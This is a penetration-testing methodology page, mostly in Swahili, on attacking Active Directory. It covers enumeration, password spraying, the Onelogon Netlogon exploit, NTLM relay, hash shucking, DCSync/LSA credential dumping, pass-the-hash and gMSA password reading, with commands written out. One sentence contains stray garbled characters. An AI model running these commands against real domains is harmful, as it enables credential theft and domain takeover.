# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Muhtasari wa msingi

**Active Directory** ni teknolojia ya msingi inayowawezesha **wasimamizi wa mtandao** kuunda na kudhibiti kwa ufanisi **domains**, **users**, na **objects** ndani ya mtandao. Imeundwa ili kupanuka, na kurahisisha upangaji wa idadi kubwa ya users katika **groups** na **subgroups** zinazoweza kudhibitiwa, huku ikidhibiti **access rights** katika viwango mbalimbali.

Muundo wa **Active Directory** unajumuisha tabaka tatu kuu: **domains**, **trees**, na **forests**. **Domain** hujumuisha mkusanyiko wa objects, kama vile **users** au **devices**, zinazoshiriki database moja. **Trees** ni makundi ya domains hizi zilizounganishwa na muundo wa pamoja, na **forest** ni mkusanyiko wa trees nyingi zilizounganishwa kupitia **trust relationships**, na kuunda tabaka la juu kabisa la muundo wa shirika. **Access** na **communication rights** maalum zinaweza kuwekwa katika kila moja ya viwango hivi.

Dhana muhimu ndani ya **Active Directory** ni pamoja na:

1. **Directory** – Huhifadhi taarifa zote zinazohusiana na objects za Active Directory.
2. **Object** – Hurejelea entities ndani ya directory, ikiwemo **users**, **groups**, au **shared folders**.
3. **Domain** – Huhifadhi objects za directory, na inaweza kuwa na domains nyingi ndani ya **forest**, kila moja ikiwa na mkusanyiko wake wa objects.
4. **Tree** – Kundi la domains zinazoshiriki root domain moja.
5. **Forest** – Kiwango cha juu kabisa cha muundo wa shirika katika Active Directory, kinachojumuisha trees kadhaa zenye **trust relationships** kati yake.

**Active Directory Domain Services (AD DS)** inajumuisha huduma mbalimbali muhimu kwa usimamizi na mawasiliano ya kati ndani ya mtandao. Huduma hizi ni:

1. **Domain Services** – Huweka data mahali pamoja na kudhibiti mwingiliano kati ya **users** na **domains**, ikiwemo utendaji wa **authentication** na **search**.
2. **Certificate Services** – Husimamia uundaji, usambazaji, na usimamizi wa **digital certificates** salama.
3. **Lightweight Directory Services** – Huwezesha applications zinazotumia directory kupitia **LDAP protocol**.
4. **Directory Federation Services** – Hutoa uwezo wa **single-sign-on** ili kuthibitisha users kwenye web applications nyingi ndani ya session moja.
5. **Rights Management** – Husaidia kulinda nyenzo zilizo na hakimiliki kwa kudhibiti usambazaji na matumizi yake yasiyoidhinishwa.
6. **DNS Service** – Ni muhimu kwa utatuzi wa **domain names**.

Kwa maelezo zaidi, angalia: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Ili kujifunza jinsi ya **kuattack AD**, unahitaji **kuelewa** vizuri sana **mchakato wa Kerberos authentication**.\
[**Soma ukurasa huu ikiwa bado hujui jinsi inavyofanya kazi.**](kerberos-authentication.md)

## Cheat Sheet

Unaweza kutembelea [https://wadcoms.github.io/](https://wadcoms.github.io) ili kuona kwa haraka commands unazoweza kutumia ku-enumerate/exploit AD.

> [!WARNING]
> Mawasiliano ya Kerberos kwa kawaida **huhitaji fully qualified domain name (FQDN)** ili client iweze kupata ticket ya SPN sahihi. Kufikia mashine kwa kutumia IP address mara nyingi husababisha kutumia NTLM badala ya Kerberos.

## Recon Active Directory (Bila creds/sessions)

Ikiwa una access tu kwenye mazingira ya AD lakini huna credentials/sessions, unaweza:

- **Kupentest mtandao:**
  - Scan mtandao, tafuta mashine na ports zilizo wazi, kisha ujaribu **ku-exploit vulnerabilities** au **kutoa credentials** kutoka humo (kwa mfano, [printers zinaweza kuwa targets zinazovutia sana](ad-information-in-printers.md)).
  - Ku-enumerate DNS kunaweza kutoa taarifa kuhusu servers muhimu kwenye domain, kama vile web, printers, shares, vpn, media, n.k.
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - Angalia [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) ya jumla ili kupata maelezo zaidi kuhusu jinsi ya kufanya hivi.
- **Angalia null na Guest access kwenye huduma za smb** (hii haitafanya kazi kwenye matoleo ya kisasa ya Windows):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - Mwongozo wa kina zaidi wa jinsi ya ku-enumerate SMB server unapatikana hapa:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Ku-enumerate Ldap**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - Mwongozo wa kina zaidi wa jinsi ya ku-enumerate LDAP unapatikana hapa (zingatia **hasa anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison mtandao**
  - Kusanya credentials [**kwa kuiga huduma kwa kutumia Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
  - Fikia host kwa [**kutumia vibaya relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
  - Kusanya credentials kwa **kuweka wazi** [**fake UPnP services kwa kutumia evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - Toa usernames/names kutoka kwenye nyaraka za ndani, mitandao ya kijamii, services (hasa web) ndani ya mazingira ya domain na pia kutoka kwenye vyanzo vinavyopatikana hadharani.
  - Ukipata majina kamili ya wafanyakazi wa kampuni, unaweza kujaribu kanuni tofauti za AD za **username (**[**soma hapa**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Kanuni zinazotumika sana ni: _NameSurname_, _Name.Surname_, _NamSur_ (herufi 3 za kila jina), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, herufi 3 _random letters and 3 random numbers_ (abc123).
  - Tools:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Angalia kurasa za [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) na [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: **Username isiyo sahihi inapoombwa**, server itajibu kwa kutumia error code ya **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, na hivyo kutuwezesha kubaini kuwa username hiyo si sahihi. **Usernames halali** zitasababisha jibu la **TGT katika AS-REP** au error _KRB5KDC_ERR_PREAUTH_REQUIRED_, ikionyesha kuwa user anatakiwa kufanya pre-authentication.
- **No Authentication dhidi ya MS-NRPC**: Tumia auth-level = 1 (No authentication) dhidi ya interface ya MS-NRPC (Netlogon) kwenye domain controllers. Mbinu hii huita function ya `DsrGetDcNameEx2` baada ya kufunga interface ya MS-NRPC ili kuangalia kama user au computer ipo bila credentials zozote. Tool ya [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) hutekeleza aina hii ya enumeration. Utafiti unapatikana [hapa](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **OWA (Outlook Web Access) Server**

Ukipata mojawapo ya seva hizi kwenye mtandao, unaweza pia kufanya **user enumeration dhidi yake**. Kwa mfano, unaweza kutumia zana ya [**MailSniper**](https://github.com/dafthack/MailSniper):

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> Unaweza kupata orodha za majina ya watumiaji katika [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) na hii ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Hata hivyo, unapaswa kuwa na **majina ya watu wanaofanya kazi katika kampuni** kutokana na hatua ya recon ambayo ulipaswa kufanya kabla ya hili. Ukiwa na jina na ukoo, unaweza kutumia script [**namemash.py**](https://gist.github.com/superkojiman/11076951) kuzalisha majina ya watumiaji yanayoweza kuwa halali.

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

Hata baada ya **Zerologon** kurekebishwa kwenye DC, akaunti zilizo kwenye allow-list wazi bado zinaweza kuathiriwa na **tabia ya zamani/iliyo hatarishi ya Netlogon secure-channel**. Mipangilio hatarishi ni GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** au thamani inayolingana ya registry **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Thamani hiyo ni **SDDL security descriptor** (tazama [Security Descriptors](security-descriptors.md)). Akaunti au kikundi chochote kilichopewa ACE husika kwenye DACL kinaweza kulengwa. Kwa mfano, `O:BAG:BAD:(A;;RC;;;WD)` huiweka kwa ufanisi **Everyone** kwenye allow-list.

Mtiririko wa kazi wa operator:

1. **Tambua principals walio kwenye allow-list** kwa kukagua **SYSVOL/GPO** na **registry ya DC inayotumika**.
2. **Tafsiri SIDs** zinazopatikana kwenye SDDL kuwa watumiaji/kompyuta halisi wa AD, kisha weka kipaumbele kwa **akaunti za mashine za DC**, **akaunti za trust**, na mashine nyingine zenye mamlaka ya juu.
3. Jaribu mara kwa mara **uthibitishaji wa MS-NRPC / Netlogon** kama akaunti iliyo kwenye allow-list.
4. Baada ya kubahatisha kwa usahihi, tumia vibaya **uwekaji wa nenosiri la Netlogon** ili kuweka upya nenosiri la akaunti inayolengwa (public PoC huiweka kuwa mfuatano tupu).<sup>[[9]](#references)[[10]](#references)</sup>

Mifano ya haraka ya uchunguzi / maabara kutoka kwenye artifact ya umma:

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

Maelezo:

- **Scanner** ni muhimu kwa sababu allow-list inayotumika inaweza kuwa katika **SYSVOL**, kwenye **registry**, au vyote viwili.
- Njia ya exploit yenyewe ni muhimu kwa sababu **haihitaji Domain Admin privileges** mara tu akaunti iliyo hatarini inapobainishwa.
- Kuhatarisha **akaunti ya mashine ya Domain Controller**, kama vile `DC$`, ni hatari sana kwa sababu kuweka upya nenosiri hilo kunaweza kuwezesha moja kwa moja njia pana zaidi za **AD takeover**.
- Uwezekano wa **brute-force** hutegemea mode: artifact ya umma inaeleza mbinu ya meet-in-the-middle, brute force ya **24-bit** ikiwa akaunti nyingine ya kompyuta inapatikana, na matoleo ya **32-bit** yaliyo polepole zaidi.

Maelezo ya kugundua/kukaza usalama:

- Kagua policy ya allow-list na uondoe kila kitu isipokuwa exceptions za muda za uoanifu zinazohitajika waziwazi.
- Fuatilia matukio ya DC **System** **5827/5828/5829/5830/5831** ili kugundua miunganisho ya Netlogon iliyo hatarini ambayo imekataliwa, kugunduliwa, au kuruhusiwa waziwazi na policy.
- Chukulia akaunti zilizo katika `VulnerableChannelAllowList` kuwa **hatari kubwa** hadi utegemezi wa mifumo ya zamani utakapoondolewa.

### Kujua jina la mtumiaji moja au kadhaa

Sawa, unajua tayari una jina halali la mtumiaji lakini huna nywila... Basi jaribu:

- [**ASREPRoast**](asreproast.md): Ikiwa mtumiaji **hana** attribute _DONT_REQ_PREAUTH_, unaweza **kuomba ujumbe wa AS_REP** wa mtumiaji huyo; utakuwa na data iliyosimbwa kwa njia fiche kwa kutumia derivation ya nywila ya mtumiaji.
- [**Password Spraying**](password-spraying.md): Hebu tujaribu **nywila za kawaida zaidi** kwa kila mtumiaji aliyegunduliwa; huenda kuna mtumiaji anatumia nywila dhaifu (zingatia password policy!).
  - Kumbuka kuwa unaweza pia **kufanya spraying kwenye seva za OWA** ili kujaribu kupata ufikiaji wa seva za barua pepe za watumiaji.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Huenda ukaweza **kupata** **hashes** za changamoto ili uzivunje kwa kufanya **poisoning** ya baadhi ya protocols za **mtandao**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Uhesabuji wa Active Directory hutoa majina ya watumiaji, vitambulisho vya barua pepe na mifumo ya majina, hosts zinazoweza kulengwa, na services ambazo zinaweza kushawishiwa kuthibitisha utambulisho. Tumia muktadha huo kutambua [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) za NTLM zinazowezekana na njia zinazoweza kuingia kwenye mazingira ya AD.

### NetExec workspace-driven recon & relay posture checks

- Tumia **`nxcdb` workspaces** kuhifadhi hali ya AD recon kwa kila engagement: `workspace create <name>` hutengeneza SQLite DB za kila protocol chini ya `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/n.k.). Badili mwonekano kwa `proto smb|mssql|winrm` na orodhesha secrets zilizokusanywa kwa `creds`. Futa data nyeti wewe mwenyewe ukimaliza: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Ugunduzi wa haraka wa subnet kwa kutumia **`netexec smb <cidr>`** huonyesha **domain**, **OS build**, **mahitaji ya SMB signing**, na **Null Auth**. Members zinazoonyesha `(signing:False)` ziko **katika hatari ya relay**, ilhali DC mara nyingi huhitaji signing.
- Tengeneza **hostnames katika /etc/hosts** moja kwa moja kutoka kwenye matokeo ya NetExec ili kurahisisha kulenga:

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- Wakati **SMB relay kwenda kwa DC imezuiwa** na signing, bado chunguza hali ya **LDAP**: `netexec ldap <dc>` huonyesha `(signing:None)` / channel binding dhaifu. DC inayohitaji SMB signing lakini LDAP signing ikiwa imezimwa bado ni lengwa linalofaa kwa **relay-to-LDAP** ili kutumia vibaya mbinu kama **SPN-less RBCD**.

### Uvujaji wa credentials za printer upande wa client → uthibitishaji wa bulk wa credentials za domain

- UI za printer/web wakati mwingine **huweka nywila za admin zilizofichwa ndani ya HTML**. Kuangalia source/devtools kunaweza kufichua cleartext (kwa mfano, `<input value="<password>">`), na kuruhusu ufikiaji wa Basic-auth kwenye hazina za scan/print.
- Print jobs zilizopatikana zinaweza kuwa na **hati za onboarding za plaintext** zenye nywila za kila mtumiaji. Weka jozi zinazolingana pamoja unapojaribu:<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### Kuiba NTLM Creds

Ikiwa unaweza **kufikia PC au share nyingine** ukitumia **null au guest user**, unaweza **kuweka faili** (kama faili ya SCF) ambazo, zikifikiwa kwa namna fulani, **zitasababisha uthibitishaji wa NTLM dhidi yako** ili uweze **kuiba** **NTLM challenge** ili ku-crack:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** huchukulia kila NT hash uliyonayo tayari kama nenosiri候候 la kujaribu kwenye miundo mingine ya polepole zaidi ambayo key material yake hutokana moja kwa moja na NT hash. Badala ya kufanya brute-force ya passphrase ndefu kwenye Kerberos RC4 tickets, NetNTLM challenges, au cached credentials, unaingiza NT hashes kwenye NT-candidate modes za Hashcat na kuiacha ithibitishe matumizi ya nenosiri lilelile bila kuhitaji kujua nenosiri lililo wazi. Hii huwa na nguvu hasa baada ya ku-compromise domain, ambapo unaweza kukusanya maelfu ya NT hashes za sasa na za awali.<sup>[[5]](#references)</sup>

Tumia shucking wakati:

- Una NT corpus kutoka DCSync, SAM/SECURITY dumps, au credential vaults na unahitaji kujaribu kama zimetumika tena kwenye domains/forests nyingine.
- Unakamata Kerberos material inayotumia RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, au DCC/DCC2 blobs.
- Unataka kuthibitisha haraka matumizi tena ya passphrase ndefu zisizoweza ku-crack, kisha ufanye pivot mara moja kupitia Pass-the-Hash.

Mbinu hii **haifanyi kazi** dhidi ya encryption types ambazo keys zake si NT hash (kwa mfano, Kerberos etype 17/18 AES). Ikiwa domain inalazimisha AES pekee, lazima urudi kwenye password modes za kawaida.

#### Kujenga NT hash corpus

- **DCSync/NTDS** – Tumia `secretsdump.py` pamoja na history ili kupata seti kubwa zaidi iwezekanavyo ya NT hashes (na thamani zake za awali):

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  Rekodi za historia huongeza kwa kiasi kikubwa orodha ya wagombea kwa sababu Microsoft inaweza kuhifadhi hadi hash 24 za awali kwa kila akaunti. Kwa njia nyingine za kupata siri za NTDS, tazama:

{{#ref}}
dcsync.md
{{#endref}}

- **Utupaji wa cache za endpoint** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (au Mimikatz `lsadump::sam /patch`) hutoa data za SAM/SECURITY za ndani na logon zilizohifadhiwa kwenye cache za domain (DCC/DCC2). Ondoa nakala zinazojirudia na uongeze hash hizo kwenye orodha ileile ya `nt_candidates.txt`.
- **Fuatilia metadata** – Hifadhi username/domain iliyotoa kila hash (hata kama wordlist ina hex pekee). Hash zinazolingana hukuambia mara moja ni principal gani inatumia tena password mara Hashcat inapochapisha candidate iliyofanikiwa.
- Pendelea candidates kutoka forest ileile au forest inayoaminiana; hilo huongeza uwezekano wa kuwepo kwa password zinazofanana wakati wa shucking.

#### Modi za Hashcat za NT-candidate

| Aina ya Hash                            | Modi ya Password | Modi ya NT-Candidate |
| ---------------------------------------- | ------------- | ----------------- |
| Credentials zilizohifadhiwa kwenye cache ya Domain (DCC)          | 1100          | 31500             |
| Credentials 2 zilizohifadhiwa kwenye cache ya Domain (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Vidokezo:

- Ingizo za NT-candidate **lazima zibaki kuwa hash za NT ghafi za herufi 32 za hex**. Zima rule engines (usiweke `-r`, wala kutumia hybrid modes) kwa sababu kubadilisha maudhui huharibu key material ya candidate.
- Modi hizi si za haraka zaidi kiasili, lakini keyspace ya NTLM (~30,000 MH/s kwenye M3 Max) ni takriban mara 100 ya kasi ya Kerberos RC4 (~300 MH/s). Kujaribu orodha ya NT iliyochaguliwa kwa makini ni nafuu zaidi kuliko kuchunguza nafasi nzima ya password katika format ya polepole.
- Tumia daima **build ya hivi karibuni ya Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`) kwa sababu modi 31500/31600/35300/35400 zilitolewa hivi karibuni.<sup>[[7]](#references)</sup>
- Kwa sasa hakuna modi ya NT ya AS-REQ Pre-Auth, na etypes za AES (19600/19700) zinahitaji password ya maandishi wazi kwa sababu keys zake hutokana na password za UTF-16LE kupitia PBKDF2, si hash ghafi za NT.

#### Mfano – Kerberoast RC4 (modi 35300)

1. Nasa RC4 TGS ya SPN lengwa kwa kutumia mtumiaji mwenye ruhusa ndogo (tazama ukurasa wa Kerberoast kwa maelezo):

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. Chambua ticket kwa kutumia orodha yako ya NT:

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcat hupata ufunguo wa RC4 kutoka kwa kila mgombea wa NT na kuthibitisha blob ya `$krb5tgs$23$...`. Ulinganifu unathibitisha kuwa akaunti ya huduma inatumia mojawapo ya hash zako za NT zilizopo.

3. Fanya pivot mara moja kupitia PtH:

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   Unaweza kurejesha plaintext baadaye kwa hiari kwa kutumia `hashcat -m 1000 <matched_hash> wordlists/` ikihitajika.

#### Mfano – Cached credentials (mode 31600)

1. Dump cached logons kutoka kwenye workstation iliyoathiriwa:

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. Nakili mstari wa DCC2 wa mtumiaji wa domain anayevutia kwenye `dcc2_highpriv.txt` na uishuck:

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. Ulinganifu uliofanikiwa hutoa NT hash ambayo tayari inajulikana kwenye orodha yako, na kuthibitisha kuwa mtumiaji aliyehifadhiwa kwenye cache anatumia tena password. Itumie moja kwa moja kwa PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) au ifanyie brute-force katika hali ya haraka ya NTLM ili kurejesha maandishi yake.

Mchakato huohuo unatumika kwa majibu ya changamoto ya NetNTLM (`-m 27000/27100`) na DCC (`-m 31500`). Ulinganifu unapopatikana, unaweza kuanzisha relay, PtH kupitia SMB/WMI/WinRM, au ku-crack tena NT hash ukiwa offline kwa kutumia masks/rules.

## Kuhesabu Active Directory KWA kutumia credentials/session

Kwa awamu hii, unahitaji kuwa **umepata credentials au session ya akaunti halali ya domain.** Ikiwa una credentials halali au shell kama mtumiaji wa domain, **kumbuka kuwa mbinu zilizotolewa awali bado zinaweza kutumiwa kupata ufikiaji wa watumiaji wengine**.

Kabla ya kuanza enumeration iliyothibitishwa, elewa **tatizo la Kerberos double-hop**.

{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Kupata ufikiaji wa akaunti ni **hatua kubwa kuelekea kutathmini domain**, kwa sababu huwezesha **enumeration ya Active Directory** iliyothibitishwa:

Kuhusu [**ASREPRoast**](asreproast.md), sasa unaweza kupata kila mtumiaji anayeweza kuwa hatarini; na kuhusu [**Password Spraying**](password-spraying.md), unaweza kupata **orodha ya majina yote ya watumiaji** na kujaribu password ya akaunti uliyoipata, password tupu na password mpya zenye matumaini.

- Unaweza kutumia [**CMD kufanya recon ya msingi**](../basic-cmd-for-pentesters.md#domain-info)
- Unaweza pia kutumia [**powershell kufanya recon**](../basic-powershell-for-pentesters/index.html), ambayo itakuwa ya siri zaidi
- Unaweza pia [**kutumia powerview**](../basic-powershell-for-pentesters/powerview.md) ili kupata maelezo ya kina zaidi
- Zana nyingine bora ya kufanya recon katika active directory ni [**BloodHound**](bloodhound.md). **Si ya siri sana** (kutegemea mbinu za ukusanyaji unazotumia), lakini **ikiwa hilo halikusumbui**, jaribu kabisa. Tafuta mahali ambapo watumiaji wanaweza kutumia RDP, tafuta njia kuelekea makundi mengine, n.k.
  - **Zana nyingine za kiotomatiki za AD enumeration ni:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- Kagua [**rekodi za DNS za AD**](ad-dns-records.md), kwani zinaweza kuwa na taarifa za kuvutia.
- **Zana yenye GUI** unayoweza kutumia kuhesabu directory ni **AdExplorer.exe** kutoka **SysInternal** Suite.
- Unaweza pia kutafuta kwenye database ya LDAP kwa kutumia **ldapsearch** ili kutafuta credentials kwenye sehemu za _userPassword_ na _unixUserPassword_, au hata kwenye madokezo ya _description_ na _info_ ya mtumiaji. Tokeni isiyo na lebo inayofanana na password kwenye _info_ ni uwezekano tu: thibitisha matumizi na uhalali wake kivyake, na usijumuishe maudhui ya madokezo katika matokeo ya kawaida ya enumeration. Tazama [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) kwa mbinu nyingine.
- Kagua script **unazoweza kufikia** za kuingia kwenye domain na za kupanga drive zilizo chini ya `\\<dc>\NETLOGON` au `\\<dc>\SYSVOL\<domain>\scripts`, ikiwa una ruhusa. [Microsoft inaeleza](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller) jukumu la share ya NETLOGON kama directory ya script. Orodhesha majina kwanza, kisha kagua script husika tu ambazo unaweza kusoma na zilizo ndani ya kikomo cha ukubwa; usitoe maudhui yote ya share wala kuonyesha thamani za credential wakati wa enumeration ya kawaida. Wito wa PowerShell wa [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) **haulindi** password halisi iliyohifadhiwa kwenye script. Wito huo pekee hauthibitishi kuwa siri imewekwa moja kwa moja kwenye script: fuatilia ingizo lake halisi, kisha thibitisha kivyake akaunti, uhalali wa credential na ruhusa. Kukagua script ya domain kwenye share ya mbali ni tofauti na enumeration ya host ya ndani.
- Ikiwa unatumia **Linux**, unaweza pia kuhesabu domain kwa kutumia [**pywerview**](https://github.com/the-useless-one/pywerview).
- Unaweza pia kujaribu zana za kiotomatiki kama:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Kutoa majina ya watumiaji wote wa domain**

  Ni rahisi sana kupata majina yote ya watumiaji wa domain kutoka Windows (`net user /domain` ,`Get-DomainUser` au `wmic useraccount get name,sid`). Kwenye Linux, unaweza kutumia: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` au `enum4linux -a -u "user" -p "password" <DC IP>`

> Ingawa sehemu hii ya Enumeration inaweza kuonekana fupi, ndiyo sehemu muhimu zaidi kuliko zote. Fungua viungo (hasa vya cmd, powershell, powerview na BloodHound), jifunze kuhesabu domain na fanya mazoezi hadi ujisikie vizuri. Wakati wa tathmini, hii ndiyo hatua muhimu ya kupata njia ya kufikia DA au kuamua kuwa hakuna kinachoweza kufanywa.

### Akaunti za kompyuta zilizoundwa mapema zenye password inayotabirika -> ufikiaji wa password ya gMSA

Akaunti za kompyuta zilizowekwa tayari kwa ajili ya kujiunga kwa kutumia mbinu za zamani zinaweza kubaki na password ya awali inayotabirika. Moduli ya `pre2k` ya NetExec hutambua thamani ya kipekee ya `userAccountControl` `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) na kujaribu kupata Kerberos TGT kwa kutumia herufi 14 za kwanza za jina la kompyuta lililoandikwa kwa herufi ndogo, bila `$` ya mwisho. Ichukulie thamani hii ya UAC kama kichujio cha kuchagua wanaoweza kuwa wagombea, badala ya kudhani kuwa uanachama wa **Pre-Windows 2000 Compatible Access** pekee unathibitisha kuwa password ni dhaifu.<sup>[[18]](#references)[[20]](#references)</sup>

Tumia LDAP enumeration iliyothibitishwa kujaribu wagombea na kuhifadhi TGT zilizofanikiwa. `ALL=True` hupanua majaribio zaidi ya objects zinazolingana na kichujio chaguomsingi cha `4128`.<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

Bind ya default/NTLM iliyoshindwa **haibatilishi** ugunduzi huu: jaribu kwa `-k`, FQDN inayotatua hadi DC, na saa iliyosawazishwa na KDC. Uendeshaji wa module uliofaulu huandika orodha za wagombea na ccaches zilizopatikana chini ya `~/.nxc/modules/pre2k/`.<sup>[[18]](#references)[[20]](#references)</sup>

Baada ya kuhatarisha principal ya kompyuta, chora uanachama wake katika vikundi vilivyopachikwa na haki zake za kutoka. Hasa, principals waliotajwa katika security descriptor ya `msDS-GroupMSAMembership` ya gMSA wanaweza kusoma `msDS-ManagedPassword`; matokeo ya `--gmsa` ya NetExec huonyesha principals wanaoruhusiwa na kurejesha NT hash ya sasa ikiwa kompyuta inayothibitisha utambulisho imeidhinishwa.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
